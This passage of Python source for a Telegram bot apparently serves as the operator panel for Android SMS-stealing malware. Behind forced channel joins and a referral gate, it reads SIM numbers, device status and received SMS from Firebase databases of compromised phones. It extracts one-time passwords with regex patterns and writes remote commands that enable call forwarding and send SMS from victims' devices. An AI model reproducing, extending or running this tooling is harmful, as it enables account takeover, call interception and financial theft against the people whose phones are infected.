    if not isinstance(channel_data, dict):
        return ""

    url = str(channel_data.get("url", "") or "").strip()
    if url:
        return url

    channel = str(channel_data.get("channel", "") or "").strip()
    if channel.startswith("@"):
        return f"https://t.me/{channel[1:]}"

    return ""


def force_join_keyboard() -> InlineKeyboardMarkup:
    """Show one Join button for every configured channel plus Verify."""
    rows = []

    for index, channel_data in enumerate(FORCE_JOIN_CHANNELS, start=1):
        if not isinstance(channel_data, dict):
            continue

        channel = str(channel_data.get("channel", "") or "").strip()
        url = get_force_join_url(channel_data)

        if not channel or not url:
            continue

        label = channel if channel.startswith("@") else f"Channel {index}"
        rows.append([premium_button(
            f"Join {label}",
            emoji_id="5084613633418199991",
            fallback_emoji="📢",
            style="primary",
            url=url
        )])

    rows.append([premium_button(
        "Verify Join",
        callback_data="verify_join",
        emoji_id="4958689671950369798",
        fallback_emoji="✅",
        style="success"
    )])

    return InlineKeyboardMarkup(rows)


def referral_gate_keyboard(user_id: int) -> InlineKeyboardMarkup:
    link = build_bot_referral_link(user_id)
    rows = [
        [premium_button(
            "My Referral Link",
            callback_data="my_ref",
            emoji_id="5084613633418199991",
            fallback_emoji="🎁",
            style="primary"
        )],
        [premium_button(
            f"Referrals {referral_count(user_id)}/{max(0, int(REQUIRED_REFERRALS))}",
            callback_data="my_ref",
            emoji_id="5372849966689566579",
            fallback_emoji="👥",
            style="primary"
        )],
        [premium_button(
            "Refresh Status",
            callback_data="gate_refresh",
            emoji_id="5116414868357907335",
            fallback_emoji="🔄",
            style="primary"
        )],
        [premium_button(
            "Request Owner Access",
            callback_data="req_acc",
            emoji_id="4958689671950369798",
            fallback_emoji="🔓",
            style="success"
        )],
    ]
    return InlineKeyboardMarkup(rows)


async def is_force_joined(bot, user_id: int) -> bool:
    """Return True only when the user has joined ALL configured channels."""
    if not FORCE_JOIN_ENABLED:
        return True

    if not FORCE_JOIN_CHANNELS:
        return True

    for channel_data in FORCE_JOIN_CHANNELS:
        if not isinstance(channel_data, dict):
            continue

        channel = str(channel_data.get("channel", "") or "").strip()
        if not channel:
            continue

        try:
            member = await bot.get_chat_member(
                chat_id=channel,
                user_id=user_id
            )
            status = str(member.status).lower()

            if status in ("creator", "administrator", "member"):
                continue

            if status == "restricted" and bool(getattr(member, "is_member", False)):
                continue

            return False
        except Exception as e:
            # ⚠️ UNREACHABLE CHANNEL PROTECTION:
            # Agar koi channel unreachable hai (bot admin nahi / galat ID /
            # channel delete ho gaya) to pehle YEHI channel saare users ko
            # hamesha ke liye lock kar deta tha — Verify kabhi pass nahi hota
            # tha. Ab us channel ko skip karte hain aur admin ko ek baar
            # warning bhejte hain taake wo usse remove kar de.
            tlog(f"Force join check failed for {channel}: {e}")
            warn_key = f"fjwarn:{channel}"
            if warn_key not in seen_ids:
                seen_ids.add(warn_key)
                try:
                    await bot.send_message(
                        OWNER_HARD_ID,
                        f"⚠️ <b>FORCE JOIN WARNING</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"Channel <code>{html_escape(channel)}</code> verify nahi ho pa raha:\n"
                        f"<code>{html_escape(str(e))[:200]}</code>\n\n"
                        f"Bot ko us channel ka <b>admin</b> banayein, ya channel ko "
                        f"Force Join list se <b>remove</b> karein.\n"
                        f"(Jab tak ye theek nahi hota, ye channel check skip ho raha hai — "
                        f"users lock nahi honge.)",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass
            continue

    return True


async def gate_state(bot, user_id: int) -> tuple[bool, str]:
    """Return (ready, reason): ready / force_join / referrals / access."""
    if user_id in ADMIN_IDS:
        return True, "ready"

    if FORCE_JOIN_ENABLED and not await is_force_joined(bot, user_id):
        return False, "force_join"

    # Master switch OFF -> no access / referral gate at all.
    if not GRANT_ACCESS_REQUIRED:
        return True, "ready"

    # A referral becomes qualified only after this user has completed
    # the required force-join step.
    qualified_now = qualify_referral(user_id)
    if qualified_now:
        referrer_id = all_users.get(user_id, {}).get("referred_by")
        if referrer_id:
            ref_count = referral_count(int(referrer_id))
            if REFERRAL_ENABLED and ref_count == max(0, int(REQUIRED_REFERRALS)):
                try:
                    await bot.send_message(
                        int(referrer_id),
                        f"🎉 <b>Referral milestone reached!</b>\n\n"
                        f"Aapke <b>{ref_count}/{REQUIRED_REFERRALS}</b> valid referrals complete ho gaye.\n"
                        "Ab bot access unlock ho gaya.",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass
            try:
                await send_private_log(
                    bot,
                    f"✅ <b>REFERRAL QUALIFIED</b>\n━━━━━━━━━━━━━━━━━━\n"
                    f"User ID: <code>{user_id}</code>\n"
                    f"Referrer: <code>{referrer_id}</code>\n"
                    f"Referrer refs: <b>{ref_count}</b>/{REQUIRED_REFERRALS}\n"
                    f"Time: <code>{datetime.now().strftime('%d %b %Y %I:%M:%S %p')}</code>",
                )
            except Exception:
                pass

    if REFERRAL_ENABLED and not referral_unlocked(user_id):
        return False, "referrals"

    return True, "ready"


async def send_gate_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE, reason: str = None) -> None:
    user_id = update.effective_chat.id
    if reason is None:
        _, reason = await gate_state(ctx.bot, user_id)

    if reason == "force_join":
        channel_lines = []
        for index, channel_data in enumerate(FORCE_JOIN_CHANNELS, start=1):
            if not isinstance(channel_data, dict):
                continue
            channel = str(channel_data.get("channel", "") or "").strip()
            if channel:
                channel_lines.append(
                    f"{index}. <code>{html_escape(channel)}</code>"
                )

        channels_text = "\n".join(channel_lines) or "No channels configured."
        text = (
            f"{premium_emoji('4958526153955476488', '🔒')} <b>JOIN REQUIRED</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "Bot use karne se pehle in sabhi channels ko join karein:\n\n"
            f"{channels_text}\n\n"
            "Sabhi channels join karne ke baad <b>Verify Join</b> dabayein.\n"
            "━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(
            text,
            reply_markup=force_join_keyboard(),
            parse_mode="HTML"
        )
        return

    if reason == "referrals":
        count = referral_count(user_id)
        need = max(0, int(REQUIRED_REFERRALS))
        text = (
            f"{premium_emoji('5084613633418199991', '🎁')} <b>REFERRAL UNLOCK</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"Bot use karne ke liye <b>{need}</b> valid referrals complete karein.\n\n"
            f"Current progress: <b>{count}/{need}</b>\n"
            "Ya phir <b>Request Owner Access</b> dabayein — owner approve karega to turant khul jayega.\n"
            "Referral tab count hoga jab referred user required join check complete karega.\n"
            "━━━━━━━━━━━━━━━━━━"
            )
        await update.message.reply_text(text, reply_markup=referral_gate_keyboard(user_id), parse_mode="HTML")
        return

    await update.message.reply_text(NO_ACCESS_TEXT, parse_mode="HTML")

# ═══════════════════════════════════════════════════════
#  DATA SAVING & LOADING
# ═══════════════════════════════════════════════════════

def save_data():
    try:
        data_to_dump = {
            "all_users": all_users,
            "DATABASES": DATABASES,
            "allowed_users": list(allowed_users),
            "admin_only_tags": list(ADMIN_ONLY_TAGS),
            "force_join_enabled": FORCE_JOIN_ENABLED,
            "grant_access_required": GRANT_ACCESS_REQUIRED,
            "force_join_channels": FORCE_JOIN_CHANNELS,
            "referral_enabled": REFERRAL_ENABLED,
            "required_referrals": REQUIRED_REFERRALS,
            "auto_db_group": AUTO_DB_GROUP,
            "auto_db_backup_group": AUTO_DB_BACKUP_GROUP,
            "auto_db_enabled": AUTO_DB_ENABLED,
            "auto_db_interval": AUTO_DB_INTERVAL,
            "maintenance_mode": MAINTENANCE_MODE,
            "log_channel_id": LOG_CHANNEL_ID,
            "sms_volume": SMS_VOLUME,
            "device_uptime": DEVICE_UPTIME,
            "panel_health": PANEL_HEALTH,
            "sender_stats": SENDER_STATS,
            "media_library": MEDIA_LIBRARY,
            "welcome_media_enabled": WELCOME_MEDIA_ENABLED,
            "access_meta": {
                str(uid): {
                    "access_expires_at": (all_users.get(uid) or {}).get("access_expires_at", 0),
                    "access_granted_at": (all_users.get(uid) or {}).get("access_granted_at", 0),
                }
                for uid in list(allowed_users)
            },
        }
        # Rolling backup — agar kabhi data corrupt/overwrite ho jaye to recover ho sake.
        try:
            import shutil as _sh
            if os.path.exists(DB_FILE):
                _sh.copyfile(DB_FILE, DB_FILE + ".bak")
        except Exception:
            pass
        with open(DB_FILE, "w") as f:
            json.dump(data_to_dump, f, indent=4)
    except Exception as e:
        tlog(f"Save Data Error: {e}")

def load_data():
    global all_users, DATABASES, allowed_users, ADMIN_ONLY_TAGS
    global FORCE_JOIN_ENABLED, FORCE_JOIN_CHANNELS, REFERRAL_ENABLED, REQUIRED_REFERRALS, LOG_CHANNEL_ID
    global GRANT_ACCESS_REQUIRED
    global AUTO_DB_GROUP, AUTO_DB_BACKUP_GROUP, AUTO_DB_ENABLED, AUTO_DB_INTERVAL, MAINTENANCE_MODE
    global LOG_CHANNEL_ID, SMS_VOLUME, DEVICE_UPTIME, PANEL_HEALTH, SENDER_STATS, MEDIA_LIBRARY, WELCOME_MEDIA_ENABLED
    DATABASES = dict(DEFAULT_DATABASES)
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                data = json.load(f)
                loaded_users = data.get("all_users", {})
                for k, v in loaded_users.items():
                    all_users[int(k)] = v
                saved_dbs = data.get("DATABASES", {})
                if saved_dbs:
                    merged = dict(DEFAULT_DATABASES)
                    merged.update(saved_dbs)
                    # ⛔ AUTO-REMOVE DISABLED: pehle yahan do tags har startup par
                    # zabardasti delete ho jate the. Ab koi DB kabhi khud se
                    # nahi udte — sirf admin manually Panel Manager se hata sakta hai.
                    DATABASES = merged
                saved_allowed = data.get("allowed_users", [])
                allowed_users = set(int(u) for u in saved_allowed)
                ADMIN_ONLY_TAGS = set(data.get("admin_only_tags", []))
                FORCE_JOIN_ENABLED = bool(data.get("force_join_enabled", FORCE_JOIN_ENABLED))
                GRANT_ACCESS_REQUIRED = bool(data.get("grant_access_required", GRANT_ACCESS_REQUIRED))

                saved_force_channels = data.get("force_join_channels")
                FORCE_JOIN_CHANNELS = []

                if isinstance(saved_force_channels, list):
                    for item in saved_force_channels:
                        if not isinstance(item, dict):
                            continue
                        channel = str(item.get("channel", "") or "").strip()
                        url = str(item.get("url", "") or "").strip()
                        if channel:
                            FORCE_JOIN_CHANNELS.append({
                                "channel": channel,
                                "url": url
                            })
                else:
                    # Backward compatibility with the old single-channel JSON format.
                    old_channel = str(data.get("force_join_channel", "") or "").strip()
                    old_url = str(data.get("force_join_url", "") or "").strip()
                    if old_channel:
                        FORCE_JOIN_CHANNELS.append({
                            "channel": old_channel,
                            "url": old_url
                        })
                REFERRAL_ENABLED = bool(data.get("referral_enabled", REFERRAL_ENABLED))
                try:
                    REQUIRED_REFERRALS = max(0, int(data.get("required_referrals", REQUIRED_REFERRALS)))
                except Exception:
                    REQUIRED_REFERRALS = 2
                try:
                    AUTO_DB_GROUP = int(data.get("auto_db_group", 0) or 0)
                except Exception:
                    AUTO_DB_GROUP = 0
                try:
                    AUTO_DB_BACKUP_GROUP = int(data.get("auto_db_backup_group", 0) or 0)
                except Exception:
                    AUTO_DB_BACKUP_GROUP = 0
                AUTO_DB_ENABLED = bool(data.get("auto_db_enabled", False))
                try:
                    AUTO_DB_INTERVAL = max(10, int(data.get("auto_db_interval", 30)))
                except Exception:
                    AUTO_DB_INTERVAL = 30
                MAINTENANCE_MODE = bool(data.get("maintenance_mode", False))
                try:
                    LOG_CHANNEL_ID = int(data.get("log_channel_id", 0) or 0)
                except Exception:
                    LOG_CHANNEL_ID = 0
                global SMS_VOLUME, DEVICE_UPTIME, PANEL_HEALTH, SENDER_STATS
                global MEDIA_LIBRARY, WELCOME_MEDIA_ENABLED
                SMS_VOLUME = data.get("sms_volume") or {}
                DEVICE_UPTIME = data.get("device_uptime") or {}
                PANEL_HEALTH = data.get("panel_health") or {}
                SENDER_STATS = data.get("sender_stats") or {}
                MEDIA_LIBRARY = data.get("media_library") or []
                if not isinstance(MEDIA_LIBRARY, list):
                    MEDIA_LIBRARY = []
                WELCOME_MEDIA_ENABLED = bool(data.get("welcome_media_enabled", True))
                for uid_s, meta in (data.get("access_meta") or {}).items():
                    try:
                        uid = int(uid_s)
                    except Exception:
                        continue
                    u = all_users.setdefault(uid, {})
                    u["access_expires_at"] = int(meta.get("access_expires_at", 0) or 0)
                    u["access_granted_at"] = int(meta.get("access_granted_at", 0) or 0)
        except Exception as e:
            tlog(f"Load Data Error: {e}")

    # ── ENFORCE SINGLE OWNER (8984851474) ──────────────────────
    # Chahe saved file me kuch bhi ho, sirf ek hi owner/admin rahega.
    try:
        ADMIN_IDS.clear()
        ADMIN_IDS.add(OWNER_HARD_ID)
        OWNER_IDS.clear()
        OWNER_IDS.add(OWNER_HARD_ID)
    except Exception:
        pass

async def auto_save_loop():
    while True:
        await asyncio.sleep(60)
        save_data()

# ═══════════════════════════════════════════════════════
#  ANTI-SPAM
# ═══════════════════════════════════════════════════════

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return False
    now = time.time()
    last_click = user_cooldowns.get(user_id, 0)
    if now - last_click < 0.5:
        return True
    user_cooldowns[user_id] = now
    return False

def tlog(msg: str) -> None:
    t = datetime.now().strftime("%I:%M:%S %p")
    print(f"[{t}]  {msg}", flush=True)


async def send_private_log(bot, text: str) -> None:
    """Post event logs to the admin-chosen private log channel (quoted)."""
    global LOG_CHANNEL_ID
    if not LOG_CHANNEL_ID:
        return
    try:
        await bot.send_message(
            chat_id=int(LOG_CHANNEL_ID),
            text=ensure_quote(text, "HTML"),
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception as e:
        tlog(f"Private log send failed: {e}")


def format_user_log_line(user) -> str:
    if user is None:
        return "Unknown"
    uname = f"@{user.username}" if getattr(user, "username", None) else "—"
    return f"{html_escape(user.full_name or 'Unknown')} | {uname} | <code>{user.id}</code>"

# ═══════════════════════════════════════════════════════
#  FIREBASE HELPERS
# ═══════════════════════════════════════════════════════

_FB_TIMEOUT = aiohttp.ClientTimeout(total=10, connect=4)

async def _get_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=100, ttl_dns_cache=300, keepalive_timeout=30)
        _http_session = aiohttp.ClientSession(connector=connector, timeout=_FB_TIMEOUT)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    """Fetch a Firebase RTDB path as JSON. Returns dict or None."""
    try:
        session = await _get_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json"
        async with session.get(url) as r:
            if r.status != 200:
                return None
            data = await r.json(content_type=None)
            if isinstance(data, dict):
                return data
            # Some Firebase paths return a list — wrap so callers still get truthy
            if isinstance(data, list) and data:
                return {str(i): v for i, v in enumerate(data)}
            return None
    except Exception:
        return None

async def fb_keys(path: str, base: str) -> list[str]:
    try:
        session = await _get_session()
        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
        async with session.get(url) as r:
            if r.status != 200: return []
            data = await r.json(content_type=None)
            return list(data.keys()) if isinstance(data, dict) else []
    except Exception:
        return []

async def fb_patch(path: str, payload: dict, base: str) -> bool:
    """Write to Firebase RTDB via PATCH. Retries once on failure."""
    for attempt in range(2):
        try:
            session = await _get_session()
            async with session.patch(f"{base}/{path}.json", json=payload) as r:
                if r.status == 200:
                    return True
                if r.status in (401, 403):
                    # Permission denied — no point retrying
                    return False
        except Exception:
            if attempt == 1:
                return False
    return False

# ═══════════════════════════════════════════════════════
#  UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════

def html_escape(text: str) -> str:
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", n)
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

OTP_PATTERNS = [
    # Explicit OTP / code / PIN / verification labels — highest confidence
    re.compile(r"(?:OTP|one.time.(?:password|code)|verification.code|auth(?:entication)?.code)[^\d]*(\d{4,8})", re.IGNORECASE),
    re.compile(r"\b(?:code|passcode|password|PIN)[^\d]*(\d{4,8})",   re.IGNORECASE),
    re.compile(r"(?:is|:)\s*(\d{4,8})\b",                            re.IGNORECASE),
    # Standalone 6-digit block (most OTPs are 6 digits) — avoid matching 7+ digit phone segs
    re.compile(r"(?<!\d)(\d{6})(?!\d)"),
    # 4-digit fallback — only when clearly not a year (1900-2099) or part of phone
    re.compile(r"(?<!\d)(?!(?:19|20)\d{2}(?!\d))(\d{4})(?!\d)"),
]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def parse_status_str(val) -> str:
    if not val: return "offline"
    return "online" if str(val).lower() == "online" else "offline"

def parse_status_bool(val) -> str:
    return "online" if val is True else "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"

def seen_key(device_id: str, k: str) -> str:
    return f"{device_id}/{k}"

async def write_call_forward(device, forward_to: str) -> bool:
    if device.sms_path.endswith("receivedSms"):
        payload = {"callForwardingEnabled": True, "forwardToNumber": forward_to, "simSlotIndex": 0}
        ok = await fb_patch(f"{device.id}/callForwarding", payload, device.base_url)
    else:
        payload = {"callForward": forward_to, "timestamp": int(time.time() * 1000), "status": "pending"}
        ok = await fb_patch(f"device_commands/{device.id}", payload, device.base_url)
    return ok

async def write_send_sms(device, to: str, body: str) -> bool:
    if device.sms_path.endswith("receivedSms"):
        payload = {"message": body, "targetNumber": to, "simSlot": 0}
        ok = await fb_patch(f"{device.id}/sendSms", payload, device.base_url)
    else:
        payload = {"sendSms": {"to": to, "body": body}, "timestamp": int(time.time() * 1000), "status": "pending"}
        ok = await fb_patch(f"device_commands/{device.id}", payload, device.base_url)
    return ok

# ═══════════════════════════════════════════════════════
#  DATA CLASSES & ASYNC FIREBASE ENGINE
# ═══════════════════════════════════════════════════════

PAGE_SIZE = 2000

class Device:
    __slots__ = (
        "id", "name", "status", "battery", "timestamp",
        "numbers", "device_info", "sms_path", "base_url", "db_tag"
    )
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag):
        self.id = id; self.name = name; self.status = status
        self.battery = battery; self.timestamp = timestamp; self.numbers = numbers
        self.device_info = device_info; self.sms_path = sms_path
        self.base_url = base_url; self.db_tag = db_tag

async def fetch_db_data(tag: str, url: str) -> list[Device]:
    devices_list = []
    added_set = set()
    try:
        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_keys("", url),
            fb_get("All_Users/simDetails", url),
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url),
            fb_get("clients", url),
        )
        if sim_all and isinstance(sim_all, dict):
            info_all = device_info_all or {}
            for dev_id, sim in sim_all.items():
                if dev_id in added_set: continue
                added_set.add(dev_id)
                info = info_all.get(dev_id) or {}
                nums = []
                for field in ("sim1Number", "sim2Number"):
                    n = (sim or {}).get(field, "")
                    if n and len(re.sub(r"\D", "", str(n))) > 4: nums.append(fmt_num(str(n)))
                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_str(info.get("Status")),
                    battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or 0),
                    numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag
                ))
        if user_data_all and isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if dev_id in added_set or not isinstance(data, dict): continue
                added_set.add(dev_id)
                nums = []
                for field in ("numberSim1", "numberSim2", "mobNo"):
                    n = data.get(field, "")
                    if n and len(re.sub(r"\D", "", str(n))) > 4: nums.append(fmt_num(str(n)))
                devices_list.append(Device(
                    id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}",
                    status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")),
                    timestamp=int(data.get("timestamp") or 0), numbers=nums,
                    device_info=data.get("Device_info") or f"Device ID: {dev_id}",
                    sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag
                ))
        if clients_all and isinstance(clients_all, dict):
            for dev_id, client in clients_all.items():
                if dev_id in added_set or not isinstance(client, dict): continue
                nums = []
                mob = client.get("mobNo") or ""
                if mob and len(re.sub(r"\D", "", mob)) > 5: nums.append(fmt_num(mob))
                elif client.get("sims") and isinstance(client["sims"], list) and client["sims"]:
                    ph = (client["sims"][0] or {}).get("phoneNumber") or ""
                    if ph and len(re.sub(r"\D", "", ph)) > 5: nums.append(fmt_num(ph))
                if not nums and not client.get("modelName"): continue
                added_set.add(dev_id)
                model = client.get("modelName") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_bool(client.get("status")),
                    battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums,
                    device_info=f"Model: {model}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag
                ))
        if root_keys:
            type4_keys = [k for k in root_keys if len(k) == 16 and re.match(r"^[0-9a-fA-F]+$", k)]
            if type4_keys:
                async def fetch_t4(k):
                    return k, await fb_get(f"{k}/deviceInfo", url), await fb_get(f"{k}/simInfo", url), await fb_get(f"{k}/heartbeat", url)
                t4results = await asyncio.gather(*(fetch_t4(k) for k in type4_keys))
                for k, info, sim, hb in t4results:
                    if not isinstance(info, dict) or k in added_set: continue
                    added_set.add(k)
                    nums = []
                    if isinstance(sim, dict):
                        for sim_v in sim.values():
                            if isinstance(sim_v, dict):
                                n = sim_v.get("number", "")
                                if n and len(re.sub(r"\D", "", n)) > 4: nums.append(fmt_num(n))
                    model = info.get("model") or info.get("brand") or f"Device-{k[:6]}"
                    ts = int(hb) if isinstance(hb, (int, float)) else 0
                    status = "online" if ts and (time.time() * 1000 - ts) < 300000 else "offline"
                    devices_list.append(Device(
                        id=k, name=model, status=status, battery=0, timestamp=ts, numbers=nums,
                        device_info=f"Model: {model}\nDevice ID: {k}", sms_path=f"{k}/receivedSms", base_url=url, db_tag=tag
                    ))
    except Exception:
        pass
    return devices_list

def _ts_num(value) -> float:
    """Firebase timestamp string/int ko safely number banata hai.
    Pehle -d.timestamp par TypeError aata tha (str) — isliye har device
    button crash ho raha tha."""
    try:
        return float(value or 0)
    except (TypeError, ValueError):
        return 0.0


async def get_all_devices(is_admin: bool = True) -> list[Device]:
    devices = []
    for tag in DATABASES.keys():
        if not is_admin and tag in ADMIN_ONLY_TAGS:
            continue
        devices.extend(GLOBAL_DEVICE_CACHE.get(tag, []))
    unique_devices = {}
    for d in devices:
        if d.id not in unique_devices: unique_devices[d.id] = d
    dev_list = list(unique_devices.values())
    dev_list.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if d.numbers else 1, -_ts_num(d.timestamp)))
    return dev_list

async def get_panel_devices(tag: str, is_admin: bool = True) -> list[Device]:
    if not is_admin and tag in ADMIN_ONLY_TAGS:
        return []
    devices = list(GLOBAL_DEVICE_CACHE.get(tag, []))
    devices.sort(key=lambda d: (0 if d.status == "online" else 1, 0 if d.numbers else 1, -_ts_num(d.timestamp)))
    return devices

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]

# ═══════════════════════════════════════════════════════
#  MESSAGE BUILDERS & UI
# ═══════════════════════════════════════════════════════

def _reply_button(text: str, emoji_id: str, style: str = "primary") -> KeyboardButton:
    """Reply-keyboard button with premium icon + style passed via api_kwargs.
    PTB ka KeyboardButton in fields ko directly accept nahi karta —
    isliye api_kwargs me bhejte hain (warna KeyboardButton.__init__ error)."""
    return KeyboardButton(
        text,
        api_kwargs={"icon_custom_emoji_id": emoji_id, "style": style},
    )


def get_reply_menu(is_admin: bool) -> ReplyKeyboardMarkup:
    # Row 1 — primary actions (most used first)
    keys = [
        [
            _reply_button("📱 Devices", "5224607267797606837", "primary"),
            _reply_button("🔑 Recent OTPs", "5206318837489743801", "success"),
        ],
        # Row 2 — search tools
        [
            _reply_button("🔍 Search", "5404561694510833322", "primary"),
            _reply_button("🔤 Keyword", "6206479140040743133", "primary"),
        ],
        # Row 3 — panel overview
        [
            _reply_button("📡 All Panels", "5235588635885054955", "primary"),
            _reply_button("📊 Panel Status", "6206446249181189526", "success"),
        ],
        # Row 4 — account
        [
            _reply_button("👤 My Profile", "5339233635620899144", "primary"),
            _reply_button("❓ Help", "5253742260054409879", "primary"),
        ],
    ]

    if is_admin:
        keys.append([
            _reply_button("🔎 Bulk Search", "5246772116543512028", "danger"),
            _reply_button("🤖 Bot Status", "5253742260054409879", "danger"),
        ])
        keys.append([
            _reply_button("⚙️ Admin Panel", "5339233635620899144", "danger"),
        ])

    return ReplyKeyboardMarkup(
        keyboard=keys,
        resize_keyboard=True,
        input_field_placeholder="Number search ya command...",
    )

def device_label(d: Device) -> str:
    # F6: check alias first
    alias = _device_aliases.get(str(d.id))
    if alias:
        return alias
    return " & ".join(d.numbers) if d.numbers else f"{d.name} ({d.id[:8]})"

def device_list_header(devices: list[Device], page: int = 0) -> str:
    online = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online

    # Device list ko compact pages mein rakho
    page_size = 6
    total_pages = max(1, (len(devices) + page_size - 1) // page_size)

    page = max(0, min(page, total_pages - 1))

    active_icon = premium_emoji(
        "5224607267797606837",
        "🟢"
    )

    offline_icon = premium_emoji(
        "6206479140040743133",
        "🔴"
    )

    title_icon = premium_emoji(
        "5253742260054409879",
        "📱"
    )

    return (
        f"{title_icon} <b>DEVICES LIST</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{active_icon} <b>Active:</b> {online}    "
        f"{offline_icon} <b>Offline:</b> {offline}\n"
        f"📱 <b>Total:</b> {len(devices)}\n"
        f"📄 <b>Page:</b> {page + 1}/{total_pages}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"Select a device:"
    )


def device_list_keyboard(
    devices: list[Device],
    page: int = 0
) -> InlineKeyboardMarkup:

    page_size = 6

    total_pages = max(
        1,
        (len(devices) + page_size - 1) // page_size
    )

    page = max(0, min(page, total_pages - 1))

    start = page * page_size
    end = start + page_size

    current_devices = devices[start:end]

    rows = []

    for d in current_devices:

        # Custom emoji + button color
        if d.status == "online":
            emoji_id = "5224607267797606837"
            button_style = "success"
        else:
            emoji_id = "6206479140040743133"
            button_style = "danger"

        # IMPORTANT:
        # Do NOT put <tg-emoji> inside button text.
        # premium_button() handles the custom emoji itself.
        if d.numbers:
            if len(d.numbers) >= 2:
                # Dual-SIM: show both numbers, truncated to fit button
                n1 = str(d.numbers[0])[-10:]  # last 10 digits
                n2 = str(d.numbers[1])[-10:]
                label = f"{n1} & {n2}"
            else:
                label = str(d.numbers[0])
        else:
            label = str(d.name or "Unknown")[:25]

        rows.append([
            premium_button(
                label,
                callback_data=f"sel:{d.id}",
                emoji_id=emoji_id,
                style=button_style
            )
        ])

    # No devices
    if not current_devices:
        rows.append([
            premium_button(
                "No devices found",
                callback_data="noop",
                emoji_id="4958526153955476488",
                style="danger"
            )
        ])

    # Pagination
    nav = []

    if page > 0:
        nav.append(
            premium_button(
                "‹ Prev",
                callback_data=f"pg:{page - 1}"
            )
        )

    nav.append(
        premium_button(
            f"{page + 1}/{total_pages}",
            callback_data="noop"
        )
    )

    if page < total_pages - 1:
        nav.append(
            premium_button(
                "Next ›",
                callback_data=f"pg:{page + 1}"
            )
        )

    rows.append(nav)

    # Actions
    rows.append([
        premium_button(
            "Refresh",
            callback_data="home"
        ),
        premium_button(
            "Active Only",
            callback_data="online"
        )
    ])

    rows.append([
        premium_button(
            "All Panels",
            callback_data="panels"
        ),
        premium_button(
            "Close",
            callback_data="close_msg"
        )
    ])

    return InlineKeyboardMarkup(rows)


def online_only_keyboard(
    devices: list[Device]
) -> InlineKeyboardMarkup:

    online = [
        d for d in devices
        if d.status == "online"
    ]

    # Safety limit:
    # Telegram keyboard ko unnecessarily huge hone se bachata hai.
    page_size = 6

    rows = []

    if online:

        # Active devices only
        for d in online[:page_size]:

            icon = premium_emoji(
                "5224607267797606837",
                "🟢"
            )

            if d.numbers:
                number = html_escape(str(d.numbers[0]))
                label = f"{icon} {number}"
            else:
                name = html_escape(
                    str(d.name or "Unknown")
                )
                name = name[:25]
                label = f"{icon} {name}"

            rows.append([
                premium_button(
                    label,
                    callback_data=f"sel:{d.id}"
                )
            ])

    else:

        rows.append([
            premium_button(
                "😴 No active device",
                callback_data="noop"
            )
        ])

    rows.append([
        premium_button(
            "Refresh",
            callback_data="online"
        ),
        premium_button(
            "📋 All Devices",
            callback_data="pg:0"
        )
    ])

    rows.append([
        premium_button(
            "Close",
            callback_data="close_msg"
        )
    ])

    return InlineKeyboardMarkup(rows)


def otp_in_date_range(sms: dict) -> bool:
    today = datetime.now().date()
    yesterday = today - timedelta(days=1)
    tomorrow  = today + timedelta(days=1)
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate") or ""
    if date_str:
